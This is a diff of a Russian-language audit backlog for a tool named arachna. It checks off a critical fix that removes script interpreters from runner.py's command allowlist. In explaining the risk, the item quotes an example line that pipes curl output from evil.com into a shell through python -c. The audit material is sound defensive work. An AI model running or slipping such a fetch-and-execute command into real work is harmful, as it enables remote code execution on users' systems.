@@ -3,7 +3,7 @@
 ## Текущий цикл — 2026-05-27, источник: аудит v0.7.0 pre-release
 
 ### [CRITICAL] src/arachna/runner.py — убрать интерпретаторы из _ALLOWED_COMMANDS
-- Источник: Безопасность / CRITICAL + Аудит RCE
+- [x] Источник: Безопасность / CRITICAL + Аудит RCE
 - Версия: v0.7.0
 - Суть: _ALLOWED_COMMANDS содержит python, node, ruby, perl, php. Каждый из них выполняет произвольный код: python -c "import os; os.system('curl evil.com | sh')". Блокировка _BLOCKED_PATTERNS тривиально обходится. Это имитация безопасности.
 - Решение: убрать 5 интерпретаторов из allowlist. Оставить строго read-only утилиты: git log, tree, cat, grep, find, ls, wc, sort, uniq, head, tail, cut, tr, sed, awk, date, env, pwd, diff. Интерпретаторы — только через --allow-scripts с явным подтверждением.
@@ -131,7 +131,7 @@
 - [x] 179 tests, 90% coverage
 
 ## v0.7.0 — Архитектура, безопасность, тестопригодность (текущий)
-- [ ] runner.py: убрать интерпретаторы из allowlist
+- [x] runner.py: убрать интерпретаторы из allowlist
 - [ ] splitter.py: пробросить токенизатор в split()
 - [ ] gatherer.py: убрать глобальный _TOKENIZE, DI
 - [ ] __main__.py: рефакторинг _cmd_all/_cmd_single
